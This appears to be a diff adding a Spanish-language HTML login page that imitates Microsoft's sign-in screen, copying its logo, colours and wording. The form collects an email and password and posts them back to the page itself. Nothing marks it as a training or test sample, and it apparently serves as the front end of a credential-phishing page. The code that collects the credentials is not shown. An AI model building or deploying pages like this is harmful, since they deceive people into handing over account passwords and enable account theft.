@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Iniciar sesión</title>
+<style>
+  body{font-family:'Segoe UI',Arial,sans-serif;background:#f2f2f2;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
+  .card{background:#fff;width:440px;max-width:92%;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+  .logo{display:flex;align-items:center;margin-bottom:16px}
+  .sq{width:22px;height:22px;display:grid;grid-template-columns:1fr 1fr;gap:2px;margin-right:8px}
+  .sq span{display:block}
+  .r{background:#f25022}.g{background:#7fba00}.b{background:#00a4ef}.y{background:#ffb900}
+  .logo b{font-size:15px;color:#5e5e5e}
+  h1{font-size:24px;font-weight:600;margin:12px 0 20px;color:#1b1b1b}
+  input{width:100%;box-sizing:border-box;border:none;border-bottom:1px solid #666;padding:8px 4px;font-size:15px;margin-bottom:20px;outline:none}
+  input:focus{border-bottom:2px solid #0067b8}
+  .btn{background:#0067b8;color:#fff;border:none;padding:8px 24px;font-size:15px;float:right;cursor:pointer}
+  .sub{font-size:13px;margin-bottom:20px}
+  a{color:#0067b8;text-decoration:none;font-size:13px}
+  .clear{clear:both}
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <div class="sq"><span class="r"></span><span class="g"></span><span class="b"></span><span class="y"></span></div>
+      <b>Microsoft</b>
+    </div>
+    <h1>Iniciar sesión</h1>
+    <form method="post" action="">
+      <input type="email" name="username" placeholder="Correo electrónico, teléfono o Skype" autocomplete="off" required>
+      <input type="password" name="password" placeholder="Contraseña" required>
+      <div class="sub"><a href="#">¿No puede acceder a su cuenta?</a></div>
+      <button class="btn" type="submit">Iniciar sesión</button>
+      <div class="clear"></div>
+    </form>
+  </div>
+</body>
+</html>
